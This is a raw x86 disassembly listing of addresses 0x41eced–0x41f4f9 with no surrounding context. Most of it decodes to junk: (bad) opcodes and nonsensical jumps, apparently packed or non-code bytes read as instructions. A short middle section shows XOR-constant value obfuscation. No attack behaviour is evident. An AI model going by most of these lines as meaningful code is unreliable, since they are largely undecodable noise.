  41eced:	mov    esi,DWORD PTR [esi]
  41ecef:	add    eax,0xd350de1
  41ecf4:	mov    cl,0x63
  41ecf6:	pop    ss
  41ecf7:	sti    
  41ecf8:	(bad)  
  41ecf9:	bnd je 0x41ecec
  41ecfc:	pop    esi
  41ecfd:	push   ecx
  41ecfe:	or     BYTE PTR [edi-0x5bc2a9b1],0xef
  41ed05:	jg     0x41ed58
  41ed07:	ret    0xbd7f
  41ed0a:	lods   al,BYTE PTR ds:[esi]
  41ed0b:	fldenv [ebx+0x60ff06a3]
  41ed11:	ds out dx,eax
  41ed13:	add    DWORD PTR [esi-0x1e3f1b86],edi
  41ed19:	std    
  41ed1a:	popf   
  41ed1b:	mov    ecx,0xa7de2352
  41ed20:	loopne 0x41ed16
  41ed22:	dec    edx
  41ed23:	push   cs
  41ed24:	call   0x486a3c1d
  41ed29:	and    BYTE PTR [esi],bl
  41ed2b:	mov    eax,ds:0x349d0e21
  41ed30:	adc    edi,edi
  41ed32:	(bad)  
  41ed33:	xchg   edi,eax
  41ed34:	push   0xd48b2f0a
  41ed39:	adc    eax,0xaf1c327a
  41ed3e:	xchg   BYTE PTR [eax+0x5cf065f],ch
  41ed44:	ret    
  41ed45:	in     al,0xb7
  41ed47:	jp     0x41ed50
  41ed49:	mov    ah,0xcf
  41ed4b:	jmp    0x41ed87
  41ed4d:	sbb    BYTE PTR [edx],dh
  41ed4f:	jl     0x41ed0e
  41ed51:	mov    bh,0x9a
  41ed53:	cmp    ebx,eax
  41ed55:	int    0x33
  41ed57:	nop
  41ed58:	cs js  0x41ece9
  41ed5b:	mov    eax,0xb435e21f
  41ed60:	mov    bh,0x77
  41ed62:	pop    eax
  41ed63:	js     0x41ed5e
  41ed65:	sbb    dl,BYTE PTR [ebx+0x1d3cb178]
  41ed6b:	push   0xfffffff5
  41ed6d:	sub    bl,BYTE PTR [edx-0x20]
  41ed70:	xchg   edx,eax
  41ed71:	jmp    FWORD PTR [eax+0x45f5bccd]
  41ed77:	push   cs
  41ed78:	clc    
  41ed79:	cmp    al,0xc3
  41ed7b:	mov    esp,0xa4aa0201
  41ed80:	push   ds
  41ed81:	inc    ebp
  41ed82:	mov    bl,0xa3
  41ed84:	dec    esp
  41ed85:	std    
  41ed86:	adc    esi,ebx
  41ed88:	mov    bh,0x54
  41ed8a:	add    ebp,DWORD PTR [ecx+0x7]
  41ed8d:	(bad)  
  41ed8f:	fimul  DWORD PTR [ebx-0x372d7c0d]
  41ed95:	mov    BYTE PTR [esi-0x2],bh
  41ed98:	pop    ebx
  41ed99:	cdq    
  41ed9a:	test   al,0x68
  41ed9c:	mov    esp,0x697faccb
  41eda1:	hlt    
  41eda2:	ja     0x41eda0
  41eda4:	shl    ebx,cl
  41eda6:	mov    ecx,esp
  41eda8:	xchg   ebp,eax
  41eda9:	pop    ebx
  41edaa:	pop    es
  41edab:	into   
  41edac:	and    DWORD PTR [ebx-0x5ad55df5],ecx
  41edb2:	xor    ch,cl
  41edb4:	imul   edx,edx,0xa6484b42
  41edba:	pop    ebp
  41edbb:	lahf   
  41edbc:	cmp    al,0x17
  41edbe:	fwait
  41edbf:	mov    DWORD PTR [esi+0xbbc867d],ebp
  41edc5:	or     BYTE PTR [esp+ebp*4+0x7a3a68f4],al
  41edcc:	(bad)  
  41edce:	daa    
  41edcf:	mov    al,ds:0xad8ad83
  41edd4:	inc    ebx
  41edd5:	adc    edx,DWORD PTR [edi+0x49]
  41edd8:	out    0xc5,al
  41edda:	imul   eax,esi,0x65
  41eddd:	sub    BYTE PTR [esi-0x4000a5e2],dh
  41ede3:	repnz xor dh,BYTE PTR [esp+eiz*2-0x10c4db89]
  41edeb:	add    DWORD PTR [ebp-0x48],ebx
  41edee:	push   esp
  41edef:	or     al,0xd9
  41edf1:	sbb    ebp,esp
  41edf3:	add    DWORD PTR [edi-0x79],esi
  41edf6:	pop    edx
  41edf7:	sti    
  41edf8:	or     eax,0x741ea049
  41edfd:	ror    DWORD PTR [edi],0x6a
  41ee00:	daa    
  41ee01:	test   DWORD PTR [edx-0x30],0xdb5f3baf
  41ee08:	cmc    
  41ee09:	jno    0x41ee14
  41ee0b:	xchg   BYTE PTR [ebx+0x67],ah
  41ee0e:	pusha  
  41ee0f:	or     al,0xba
  41ee11:	sbb    esp,0x7aa07199
  41ee17:	scas   eax,DWORD PTR es:[edi]
  41ee18:	mov    WORD PTR [edx-0x23],es
  41ee1b:	lods   al,BYTE PTR ds:[esi]
  41ee1c:	clc    
  41ee1d:	inc    edx
  41ee1e:	jb     0x41ee7a
  41ee20:	jno    0x41edd6
  41ee22:	rcr    DWORD PTR [ebp+0x3cd20bfc],0xc
  41ee29:	xor    eax,0x315aeb29
  41ee2e:	test   al,cl
  41ee30:	ret    
  41ee31:	push   eax
  41ee32:	add    eax,0xaf158a85
  41ee37:	jno    0x41ee95
  41ee39:	or     BYTE PTR [eax],0x21
  41ee3c:	ds inc ebp
  41ee3e:	and    ecx,ecx
  41ee40:	jo     0x41ee1b
  41ee42:	(bad)  
  41ee43:	mov    al,ds:0x6401748b
  41ee48:	test   DWORD PTR [esi+0x7d98a756],edi
  41ee4e:	cmp    bl,bl
  41ee50:	add    DWORD PTR [ebx-0x47],ebx
  41ee53:	lods   al,BYTE PTR ds:[esi]
  41ee54:	or     cl,BYTE PTR [eax-0x5a]
  41ee57:	aam    0x1b
  41ee59:	cmc    
  41ee5a:	pop    ebx
  41ee5b:	pop    ecx
  41ee5c:	dec    esp
  41ee5d:	fwait
  41ee5e:	jae    0x41ee83
  41ee60:	test   eax,0x7b79b5bb
  41ee65:	xchg   ecx,eax
  41ee66:	into   
  41ee67:	push   ebx
  41ee68:	mov    ebp,0x1a2f8e7b
  41ee6d:	shr    DWORD PTR [ebx-0x73],cl
  41ee70:	push   eax
  41ee71:	rol    DWORD PTR [ebx+esi*8],1
  41ee74:	aaa    
  41ee75:	aaa    
  41ee76:	rcr    DWORD PTR [edx+0xd52bb76],cl
  41ee7c:	pop    ds
  41ee7d:	sbb    dl,BYTE PTR [ecx+0x26ad9924]
  41ee83:	(bad)  
  41ee84:	ss jae 0x41ee2a
  41ee87:	dec    ebx
  41ee88:	pop    eax
  41ee89:	xchg   ebp,eax
  41ee8a:	jmp    0xa4d7d357
  41ee8f:	and    eax,0xcb8e5743
  41ee94:	out    0x99,eax
  41ee96:	div    DWORD PTR gs:[edx+ecx*8]
  41ee9a:	push   0xffffff86
  41ee9c:	(bad)  
  41ee9e:	mov    ds:0xb06af1be,al
  41eea3:	dec    edx
  41eea4:	in     ax,dx
  41eea6:	popf   
  41eea7:	and    bl,bh
  41eea9:	pop    ebx
  41eeaa:	mov    edx,0x8406fd91
  41eeaf:	or     al,0xeb
  41eeb1:	fs iret 
  41eeb3:	xchg   ebp,eax
  41eeb4:	mov    bh,0xa
  41eeb6:	jmp    0x41ee73
  41eeb8:	push   ss
  41eeb9:	int    0xa4
  41eebb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eebc:	sbb    edx,edx
  41eebe:	popa   
  41eebf:	or     al,0x2c
  41eec1:	test   BYTE PTR [edi],cl
  41eec3:	fdivrp st(0),st
  41eec5:	hlt    
  41eec6:	js     0x41ee8a
  41eec8:	inc    eax
  41eec9:	mov    ebx,0x3e8b0096
  41eece:	data16 xor BYTE PTR [eax-0x3a],dl
  41eed2:	repnz (bad) 
  41eed4:	int    0xc5
  41eed6:	or     DWORD PTR [esi-0x2b],esi
  41eed9:	inc    esi
  41eeda:	cs jle 0x41eea0
  41eedd:	jbe    0x41ef1a
  41eedf:	xchg   edi,eax
  41eee0:	(bad)  
  41eee1:	mov    BYTE PTR [edi+0x68],dl
  41eee4:	leave  
  41eee5:	cmp    esp,edx
  41eee7:	pop    ds
  41eee8:	mov    bh,0x9e
  41eeea:	jno    0x41eefa
  41eeec:	lock jg 0x41ee7d
  41eeef:	loope  0x41ee92
  41eef1:	repnz int 0x2a
  41eef4:	frstpm(287 only) 
  41eef6:	ss mov cl,0xc8
  41eef9:	test   DWORD PTR [edx+0x6f],ecx
  41eefc:	xchg   BYTE PTR [edx],ah
  41eefe:	nop
  41eeff:	shl    DWORD PTR [ebx],1
  41ef01:	and    eax,DWORD PTR [ecx-0x78414df2]
  41ef07:	sbb    al,BYTE PTR [eax]
  41ef09:	xchg   esi,eax
  41ef0a:	fidiv  DWORD PTR [ebp+eiz*1+0x6e]
  41ef0e:	add    bh,BYTE PTR [ecx+0x55]
  41ef11:	in     al,0x1
  41ef13:	jge    0x41ef91
  41ef15:	jge    0x41ef7a
  41ef17:	ss inc esi
  41ef19:	mov    esp,0x55ba56bf
  41ef1e:	and    BYTE PTR [edx-0x1d],0xee
  41ef22:	dec    ecx
  41ef23:	repz jae 0x41eee5
  41ef26:	rcl    DWORD PTR [esi],1
  41ef28:	out    dx,al
  41ef29:	fist   WORD PTR [ebx+0xf]
  41ef2c:	dec    esp
  41ef2d:	jge    0x41efa3
  41ef2f:	pop    es
  41ef30:	dec    ebp
  41ef31:	or     al,0xa8
  41ef33:	shl    ch,cl
  41ef35:	pop    ebx
  41ef36:	pop    ebx
  41ef37:	das    
  41ef38:	pop    edx
  41ef39:	add    ch,bh
  41ef3b:	sar    DWORD PTR [eax+edi*1-0x26],1
  41ef3f:	das    
  41ef40:	loop   0x41eeed
  41ef42:	int    0xef
  41ef44:	cmp    edi,esi
  41ef46:	and    BYTE PTR [ebx+0x27bd836f],bl
  41ef4c:	add    BYTE PTR [esp+ebx*2-0x16],cl
  41ef50:	test   BYTE PTR [eax-0x2ae57ba5],al
  41ef56:	inc    ebx
  41ef57:	sbb    BYTE PTR [edi+edx*1+0x4a],al
  41ef5b:	js     0x41eeef
  41ef5d:	sbb    eax,0x27a4fd38
  41ef62:	inc    eax
  41ef63:	scas   eax,DWORD PTR es:[edi]
  41ef64:	imul   ebx
  41ef66:	adc    al,0xb
  41ef68:	pop    ds
  41ef69:	xchg   esi,eax
  41ef6a:	adc    BYTE PTR [esi],dl
  41ef6c:	shl    BYTE PTR [ebp+0x1],1
  41ef6f:	rol    DWORD PTR [eax-0x5],cl
  41ef72:	out    dx,eax
  41ef73:	jne    0x41efbd
  41ef75:	popa   
  41ef76:	push   ebp
  41ef77:	popa   
  41ef78:	mov    ds:0x630fdebc,eax
  41ef7d:	jns    0x41efa0
  41ef7f:	push   ss
  41ef80:	int    0x4e
  41ef82:	cmp    eax,0x939726b4
  41ef87:	aaa    
  41ef88:	hlt    
  41ef89:	adc    ch,BYTE PTR [edx+0x29]
  41ef8c:	xor    esp,DWORD PTR [esi-0x5df88dc5]
  41ef92:	push   eax
  41ef93:	enter  0xfd4b,0x46
  41ef97:	daa    
  41ef98:	push   ebp
  41ef99:	or     esi,DWORD PTR [ebx]
  41ef9b:	pop    ebp
  41ef9c:	in     al,dx
  41ef9d:	add    BYTE PTR [ebx],dl
  41ef9f:	xor    eax,DWORD PTR [ebx]
  41efa1:	call   0x71c4:0xc570f521
  41efa8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41efa9:	retf   0x3c9e
  41efac:	push   0xe515b78b
  41efb1:	jo     0x41efe7
  41efb3:	fcomip st,st(5)
  41efb5:	adc    cl,BYTE PTR [esi]
  41efb7:	jecxz  0x41ef79
  41efb9:	pop    eax
  41efba:	or     DWORD PTR [edi+0x37ecbec],edi
  41efc0:	and    BYTE PTR [esi+0x45],dl
  41efc3:	ds sbb eax,0xe1f209e
  41efc9:	call   FWORD PTR [ebp*1-0x2530a771]
  41efd0:	adc    edx,DWORD PTR [eax-0x1]
  41efd3:	cmc    
  41efd4:	lds    ebp,FWORD PTR [eax]
  41efd6:	mov    eax,0xd1ac582a
  41efdb:	sub    BYTE PTR [ebx-0x33eb72ba],dl
  41efe1:	xor    DWORD PTR [eax+0x64d8c209],ecx
  41efe7:	loop   0x41ef8b
  41efe9:	popa   
  41efea:	in     eax,dx
  41efeb:	mov    esi,DWORD PTR [ecx]
  41efed:	repnz push es
  41efef:	dec    esi
  41eff0:	mov    edx,DWORD PTR cs:[ebp-0x150]
  41eff7:	xor    eax,0xcb79b576
  41effc:	xor    edx,0x9c2b8ae8
  41f002:	mov    cl,0x2
  41f004:	call   0x408bb8
  41f009:	mov    esi,eax
  41f00b:	mov    edi,edx
  41f00d:	mov    eax,DWORD PTR [ebp-0x154]
  41f013:	mov    edx,DWORD PTR [ebp-0x150]
  41f019:	xor    eax,0xcb79b576
  41f01e:	xor    edx,0x9c2b8ae8
  41f024:	mov    cl,0x3e
  41f026:	call   0x4223ad
  41f02b:	or     esi,eax
  41f02d:	or     edi,edx
  41f02f:	mov    eax,DWORD PTR [ebp-0x160]
  41f035:	imul   esi,eax
  41f038:	add    esi,DWORD PTR [ebp-0x170]
  41f03e:	mov    DWORD PTR [ebp-0x16c],esi
  41f044:	mov    eax,DWORD PTR [ebp-0x16c]
  41f04a:	mov    DWORD PTR [ebp-0x178],eax
  41f050:	jmp    0x41f19e
  41f055:	jmp    0x41f105
  41f05a:	mov    eax,DWORD PTR [ebp-0x154]
  41f060:	mov    edx,DWORD PTR [ebp-0x150]
  41f066:	xor    eax,0xcb79b576
  41f06b:	xor    edx,0x9c2b8ae8
  41f071:	mov    cl,0x2
  41f073:	call   0x408bb8
  41f078:	mov    esi,eax
  41f07a:	mov    edi,edx
  41f07c:	mov    eax,DWORD PTR [ebp-0x154]
  41f082:	mov    edx,DWORD PTR [ebp-0x150]
  41f088:	xor    eax,0xcb79b576
  41f08d:	xor    edx,0x9c2b8ae8
  41f093:	mov    cl,0x3e
  41f095:	call   0x4223ad
  41f09a:	or     esi,eax
  41f09c:	or     edi,edx
  41f09e:	mov    eax,DWORD PTR [ebp-0x15c]
  41f0a4:	mov    edx,DWORD PTR [ebp-0x158]
  41f0aa:	xor    eax,0xcb79b576
  41f0af:	xor    edx,0x9c2b8ae8
  41f0b5:	mov    cl,0x2
  41f0b7:	call   0x408bb8
  41f0bc:	mov    ebx,eax
  41f0be:	mov    eax,edx
  41f0c0:	mov    ecx,DWORD PTR [ebp-0x15c]
  41f0c6:	mov    edx,DWORD PTR [ebp-0x158]
  41f0cc:	xor    ecx,0xcb79b576
  41f0d2:	xor    edx,0x9c2b8ae8
  41f0d8:	mov    DWORD PTR [ebp-0x234],eax
  41f0de:	mov    eax,ecx
  41f0e0:	mov    cl,0x3e
  41f0e2:	call   0x4223ad
  41f0e7:	or     ebx,eax
  41f0e9:	mov    eax,DWORD PTR [ebp-0x234]
  41f0ef:	or     eax,edx
  41f0f1:	push   eax
  41f0f2:	push   ebx
  41f0f3:	push   edi
  41f0f4:	push   esi
  41f0f5:	call   0x41594e
  41f0fa:	mov    DWORD PTR [ebp-0x178],eax
  41f100:	jmp    0x41f19e
  41f105:	mov    eax,DWORD PTR [ebp-0x15c]
  41f10b:	mov    edx,DWORD PTR [ebp-0x158]
  41f111:	xor    eax,0xcb79b576
  41f116:	xor    edx,0x9c2b8ae8
  41f11c:	mov    cl,0x2
  41f11e:	call   0x408bb8
  41f123:	mov    esi,eax
  41f125:	mov    edi,edx
  41f127:	mov    eax,DWORD PTR [ebp-0x15c]
  41f12d:	mov    edx,DWORD PTR [ebp-0x158]
  41f133:	xor    eax,0xcb79b576
  41f138:	xor    edx,0x9c2b8ae8
  41f13e:	mov    cl,0x3e
  41f140:	call   0x4223ad
  41f145:	or     esi,eax
  41f147:	or     edi,edx
  41f149:	mov    DWORD PTR [ebp-0x178],esi
  41f14f:	jmp    0x41f19e
  41f154:	mov    eax,DWORD PTR [ebp-0x15c]
  41f15a:	mov    edx,DWORD PTR [ebp-0x158]
  41f160:	xor    eax,0xcb79b576
  41f165:	xor    edx,0x9c2b8ae8
  41f16b:	mov    cl,0x2
  41f16d:	call   0x408bb8
  41f172:	mov    esi,eax
  41f174:	mov    edi,edx
  41f176:	mov    eax,DWORD PTR [ebp-0x15c]
  41f17c:	mov    edx,DWORD PTR [ebp-0x158]
  41f182:	xor    eax,0xcb79b576
  41f187:	xor    edx,0x9c2b8ae8
  41f18d:	mov    cl,0x3e
  41f18f:	call   0x4223ad
  41f194:	or     esi,eax
  41f196:	or     edi,edx
  41f198:	mov    DWORD PTR [ebp-0x178],esi
  41f19e:	mov    ecx,DWORD PTR [ebp-0xd8]
  41f1a4:	mov    eax,0x459a
  41f1a9:	xor    edx,edx
  41f1ab:	div    ecx
  41f1ad:	jmp    0x41f594
  41f1b2:	push   edx
  41f1b3:	inc    ebx
  41f1b4:	sbb    eax,0xbcab304b
  41f1b9:	pop    esp
  41f1ba:	or     edi,DWORD PTR [edx]
  41f1bc:	cld    
  41f1bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f1be:	mov    ds:0xc09e2092,al
  41f1c3:	jg     0x41f185
  41f1c5:	mov    esi,0xbebec44a
  41f1ca:	xchg   DWORD PTR ds:0xcb138b40,esp
  41f1d0:	cmp    DWORD PTR [edi+0x69],esp
  41f1d3:	or     DWORD PTR ds:0x27646cad,ebx
  41f1d9:	cmp    BYTE PTR [esi],0xc1
  41f1dc:	frstor [ebx]
  41f1de:	and    eax,0xfa264280
  41f1e3:	sub    al,ah
  41f1e5:	(bad)  
  41f1e6:	aad    0xe0
  41f1e8:	adc    eax,0x21c1e5c5
  41f1ed:	adc    edx,edi
  41f1ef:	pop    es
  41f1f0:	jb     0x41f1ae
  41f1f2:	push   ebp
  41f1f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f1f4:	lods   eax,DWORD PTR ds:[esi]
  41f1f5:	mov    ds:0xf6b11ddc,eax
  41f1fa:	clc    
  41f1fb:	fild   QWORD PTR [edx]
  41f1fd:	inc    ebp
  41f1fe:	test   bh,cl
  41f200:	in     eax,dx
  41f201:	enter  0x7ac2,0xa8
  41f205:	fcomp  DWORD PTR [esi+0xb]
  41f208:	inc    esi
  41f209:	adc    eax,0x8321d96b
  41f20e:	push   0x6a
  41f210:	dec    esp
  41f211:	daa    
  41f212:	rcl    BYTE PTR [ebp+0x1a],1
  41f215:	popf   
  41f216:	xor    cl,BYTE PTR [ebx+0x14]
  41f219:	mov    ?,WORD PTR [ebx-0x41]
  41f21c:	scas   al,BYTE PTR es:[edi]
  41f21d:	test   al,0xd0
  41f21f:	dec    ecx
  41f220:	pop    es
  41f221:	outs   dx,BYTE PTR ds:[esi]
  41f222:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f223:	cmp    DWORD PTR [ebp+0x76c029be],0x31
  41f22a:	xchg   esi,eax
  41f22b:	sub    bl,dh
  41f22d:	adc    al,0x73
  41f22f:	(bad)  
  41f230:	aas    
  41f231:	int3   
  41f232:	adc    al,0xff
  41f234:	(bad)  
  41f235:	push   ebp
  41f236:	push   ss
  41f237:	adc    dl,BYTE PTR [eax-0x6fdc1573]
  41f23d:	sbb    ch,BYTE PTR [eax-0x1dde7676]
  41f243:	data16 loopne 0x41f1cd
  41f246:	mov    ebp,0x2da9fab6
  41f24b:	inc    eax
  41f24c:	lods   eax,DWORD PTR ds:[esi]
  41f24d:	jne    0x41f2bd
  41f24f:	outs   dx,BYTE PTR ds:[esi]
  41f250:	fisubr DWORD PTR [ebp+0x61b8f585]
  41f256:	std    
  41f257:	jmp    0xbfaf:0x498bc1b0
  41f25e:	stos   DWORD PTR es:[edi],eax
  41f25f:	add    ecx,DWORD PTR [edi]
  41f261:	jg     0x41f2b5
  41f263:	or     bh,BYTE PTR [edi-0x3176d255]
  41f269:	rep ds ins BYTE PTR es:[edi],dx
  41f26c:	les    ebx,FWORD PTR [ecx+ebx*1+0x2aa7cf18]
  41f273:	add    al,0xb2
  41f275:	shl    DWORD PTR [edx],0x56
  41f278:	popa   
  41f279:	jg     0x5e275d4e
  41f27f:	inc    edx
  41f280:	inc    esi
  41f281:	lahf   
  41f282:	mov    ebx,0xa1f7a63c
  41f287:	jbe    0x41f281
  41f289:	je     0x41f2e4
  41f28b:	or     esi,DWORD PTR [esi]
  41f28d:	add    al,0x2b
  41f290:	jmp    0x41f2ba
  41f292:	cs xchg ebp,eax
  41f294:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f295:	or     eax,0xc8b2be87
  41f29a:	pop    esp
  41f29b:	push   cs
  41f29c:	lea    edi,[edi-0x2031fee]
  41f2a2:	rol    ah,cl
  41f2a4:	add    BYTE PTR [ebp-0x29],ch
  41f2a7:	jmp    0x4170ee8e
  41f2ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f2ad:	hlt    
  41f2ae:	jb     0x41f2d2
  41f2b0:	inc    ebx
  41f2b1:	je     0x41f2b3
  41f2b3:	mov    al,0x27
  41f2b5:	adc    al,0xa5
  41f2b7:	fsub   DWORD PTR [ebx]
  41f2b9:	sbb    DWORD PTR [esi+0x6e],esp
  41f2bc:	jnp    0x41f27f
  41f2be:	or     al,0xe0
  41f2c0:	leave  
  41f2c1:	icebp  
  41f2c2:	add    al,BYTE PTR [ecx+0x63]
  41f2c5:	neg    ebx
  41f2c7:	adc    dl,dh
  41f2c9:	dec    esp
  41f2ca:	sti    
  41f2cb:	lods   eax,DWORD PTR ds:[esi]
  41f2cc:	adc    DWORD PTR [eax],eax
  41f2ce:	or     al,0x2f
  41f2d0:	fdiv   st,st(1)
  41f2d2:	push   cs
  41f2d3:	out    0x6f,al
  41f2d5:	mov    cl,0x73
  41f2d7:	loop   0x41f27c
  41f2d9:	jns    0x41f2a8
  41f2db:	in     eax,dx
  41f2dc:	into   
  41f2dd:	push   ds
  41f2de:	mov    eax,0x46f5148b
  41f2e3:	rcl    bh,1
  41f2e5:	mov    ds:0xb4dc3467,al
  41f2ea:	or     DWORD PTR [esi],ecx
  41f2ec:	mov    ss,WORD PTR [esi]
  41f2ee:	iret   
  41f2ef:	loopne 0x41f2d4
  41f2f1:	jmp    0x63ef:0x38839d0f
  41f2f8:	sbb    al,0x2e
  41f2fa:	sbb    DWORD PTR [ebx+0x17cf396],0x5f
  41f301:	adc    eax,0xde1338a4
  41f306:	pop    edi
  41f307:	pop    ss
  41f308:	xchg   ebp,eax
  41f309:	push   0xffffff93
  41f30b:	pop    es
  41f30c:	daa    
  41f30d:	sbb    al,0xc8
  41f30f:	(bad)  
  41f310:	pop    esp
  41f311:	fsubp  st(4),st
  41f313:	push   ebp
  41f314:	push   eax
  41f315:	and    edi,ecx
  41f317:	add    eax,0xb3d4c197
  41f31c:	lahf   
  41f31d:	fst    DWORD PTR [edx+ebx*2+0x65166f8e]
  41f324:	inc    esp
  41f325:	data16 sub ch,dl
  41f328:	aad    0x50
  41f32a:	mov    esp,0x7d950e95
  41f32f:	daa    
  41f330:	jge    0x41f354
  41f332:	(bad)  
  41f333:	pop    edi
  41f334:	out    0xe5,al
  41f336:	adc    DWORD PTR [edx],edx
  41f338:	mov    ds:0xb390a75,al
  41f33d:	test   esi,edx
  41f33f:	adc    eax,0xcdb3ce39
  41f344:	in     eax,dx
  41f345:	adc    ecx,DWORD PTR [edi+0x524aede2]
  41f34b:	sbb    ebx,edi
  41f34d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f34e:	sar    DWORD PTR [edi+0x65],0x20
  41f352:	cdq    
  41f353:	add    al,0xfb
  41f355:	pop    edx
  41f356:	push   esi
  41f357:	jne    0x41f330
  41f359:	jmp    0xcdfb750d
  41f35e:	test   BYTE PTR [ecx+0x123048b0],dh
  41f364:	mov    edx,0xa8357859
  41f369:	and    al,BYTE PTR [ebx]
  41f36b:	pop    edi
  41f36c:	rol    BYTE PTR [edi],cl
  41f36e:	bnd jge 0x41f32c
  41f371:	xor    bh,bl
  41f373:	mov    bl,0xb0
  41f375:	dec    edx
  41f376:	push   edx
  41f377:	test   DWORD PTR [edx],esi
  41f379:	ret    
  41f37a:	(bad)  
  41f37b:	daa    
  41f37c:	fwait
  41f37d:	or     DWORD PTR [ebp-0x2fa8a23],esi
  41f383:	add    DWORD PTR [edi+0x2a],esi
  41f386:	xchg   ebp,eax
  41f387:	hlt    
  41f388:	add    dh,bh
  41f38a:	aam    0x30
  41f38c:	push   es
  41f38d:	and    eax,DWORD PTR ds:0xdc02ef9
  41f393:	movd   mm3,DWORD PTR [edx]
  41f396:	test   DWORD PTR [esi],esi
  41f398:	cs jb  0x41f3bd
  41f39b:	sar    BYTE PTR [eax],0x6d
  41f39e:	leave  
  41f39f:	ins    DWORD PTR es:[edi],dx
  41f3a0:	pop    ss
  41f3a1:	xchg   cl,ah
  41f3a3:	pop    edx
  41f3a4:	jns    0x41f38b
  41f3a6:	jo     0x41f3cd
  41f3a8:	inc    esp
  41f3a9:	jecxz  0x41f413
  41f3ab:	or     DWORD PTR [ebx],ebx
  41f3ad:	std    
  41f3ae:	add    eax,DWORD PTR [esi+edi*1-0x7a918da6]
  41f3b5:	jo     0x41f372
  41f3b7:	pop    ecx
  41f3b8:	pop    ebp
  41f3b9:	pop    esi
  41f3ba:	in     eax,0x9f
  41f3bc:	or     eax,0xb3615017
  41f3c1:	pop    es
  41f3c2:	test   BYTE PTR [ebp*1+0x6f948ff5],dh
  41f3c9:	retf   0xe366
  41f3cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f3cd:	hlt    
  41f3ce:	mov    ah,0x3b
  41f3d0:	xchg   ebx,eax
  41f3d1:	icebp  
  41f3d2:	and    eax,0xcabf5e6d
  41f3d7:	push   ecx
  41f3d8:	aaa    
  41f3d9:	adc    dh,BYTE PTR [ebx+0x30]
  41f3dc:	repz out dx,eax
  41f3de:	out    0x76,al
  41f3e0:	mov    DWORD PTR [esi],ecx
  41f3e2:	cmp    DWORD PTR [edi+0x15],eax
  41f3e5:	inc    esp
  41f3e6:	push   cs
  41f3e7:	dec    esi
  41f3e8:	xchg   esp,eax
  41f3e9:	sahf   
  41f3ea:	xchg   esi,eax
  41f3eb:	mov    ebp,0x338a99c8
  41f3f0:	fsubr  DWORD PTR [edi+0x13]
  41f3f3:	push   eax
  41f3f4:	xor    ebp,edi
  41f3f6:	popa   
  41f3f7:	add    edi,DWORD PTR [eax+0x2c]
  41f3fa:	rol    dh,cl
  41f3fc:	pop    edx
  41f3fd:	push   cs
  41f3fe:	and    eax,0xa3935aa1
  41f403:	rcr    BYTE PTR [edi-0x22ea1579],cl
  41f409:	cmp    al,0x63
  41f40b:	retw   0x134d
  41f40f:	push   edi
  41f410:	xor    dh,0x70
  41f413:	ins    BYTE PTR es:[edi],dx
  41f414:	aam    0xab
  41f416:	les    esp,FWORD PTR [edi+0x49c5c5f1]
  41f41c:	and    BYTE PTR [eax-0x27],cl
  41f41f:	and    esi,0xabe1f01c
  41f425:	fidiv  DWORD PTR [eax+esi*8-0x3]
  41f429:	sub    DWORD PTR ds:0x552f4b7,esp
  41f42f:	loop   0x41f46f
  41f431:	loope  0x41f3d5
  41f433:	cmp    eax,0xbc8637a6
  41f438:	call   0xee0c45a2
  41f43d:	stos   BYTE PTR es:[edi],al
  41f43e:	leave  
  41f43f:	inc    ecx
  41f440:	ficomp WORD PTR [ecx+0x8]
  41f443:	adc    eax,0x43865622
  41f448:	sbb    al,0xd5
  41f44a:	call   0x3de2fa12
  41f44f:	and    eax,eax
  41f451:	jae    0x41f4b6
  41f453:	jge    0x41f459
  41f455:	es mov esi,0x47d83860
  41f45b:	in     al,dx
  41f45c:	daa    
  41f45d:	icebp  
  41f45e:	outs   dx,DWORD PTR ds:[esi]
  41f45f:	sub    DWORD PTR [ecx],edx
  41f461:	or     al,0xbf
  41f463:	rcr    bl,1
  41f465:	sbb    DWORD PTR [ebx],eax
  41f467:	xor    BYTE PTR [esi],ah
  41f469:	inc    edx
  41f46a:	and    DWORD PTR [ebp-0x4bedf6dc],esi
  41f470:	pop    eax
  41f471:	adc    al,0x27
  41f473:	push   ebx
  41f474:	xlat   BYTE PTR ds:[ebx]
  41f475:	mov    ds:0x22d90bf8,al
  41f47a:	jb     0x41f4e1
  41f47c:	mov    ebx,0x7a2bde9d
  41f481:	sub    al,0xe
  41f483:	add    al,0x21
  41f485:	popa   
  41f486:	xor    eax,0x8724c5da
  41f48b:	xor    esp,ebp
  41f48d:	inc    esi
  41f48e:	mov    eax,0xa6a5be12
  41f493:	add    DWORD PTR [eax+0x66],esi
  41f496:	rcr    BYTE PTR [edi-0x1ff5e126],0x6
  41f49d:	or     bh,BYTE PTR [esi]
  41f49f:	inc    esp
  41f4a0:	push   ss
  41f4a1:	inc    edx
  41f4a2:	inc    eax
  41f4a3:	test   al,0xd5
  41f4a5:	xchg   BYTE PTR [ebp-0x20032ade],al
  41f4ab:	mov    esp,0xf602adc6
  41f4b0:	jbe    0x41f519
  41f4b2:	cwde   
  41f4b3:	pushf  
  41f4b4:	mov    BYTE PTR [ebp+ebp*2-0x1],dh
  41f4b8:	(bad)  
  41f4b9:	mov    ds:0x32e68b37,eax
  41f4be:	not    DWORD PTR [ecx]
  41f4c0:	adc    al,0x5d
  41f4c2:	add    eax,0x96ae344f
  41f4c7:	int3   
  41f4c8:	jno    0x41f520
  41f4ca:	push   eax
  41f4cb:	test   BYTE PTR [edi-0x166da263],ch
  41f4d1:	push   ebp
  41f4d2:	mov    edx,0xc87c10ec
  41f4d7:	(bad)  [ebx]
  41f4d9:	retf   
  41f4da:	inc    edi
  41f4db:	sahf   
  41f4dc:	push   0x535f20b8
  41f4e1:	mov    ch,0xbe
  41f4e3:	int    0xeb
  41f4e5:	push   0x7a
  41f4e7:	les    ecx,FWORD PTR [edx+0x7c]
  41f4ea:	mov    al,cs:0xc9cdb7bb
  41f4f0:	(bad)  
  41f4f1:	retf   0xc739
  41f4f4:	jmp    0x13246b0d
  41f4f9:	xchg   BYTE PTR [ebx+0x36],dh
